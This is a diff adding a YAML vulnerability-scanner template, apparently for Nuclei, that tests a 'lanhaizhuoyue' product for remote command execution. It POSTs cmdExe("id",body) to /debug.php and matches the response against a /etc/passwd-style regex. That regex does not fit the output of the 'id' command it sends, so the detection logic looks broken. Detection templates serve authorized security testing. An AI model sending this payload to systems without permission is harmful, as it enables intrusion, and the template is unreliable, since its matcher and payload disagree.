@@ -1,0 +1,24 @@
+id: lanhaizhuoyue-debug-rce
+
+info:
+  name: lanhaizhuoyue-debug-rce
+  author: Co5mos
+  severity: critical
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/debug.php"
+    
+    body: |
+      cmdExe("id",body)
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
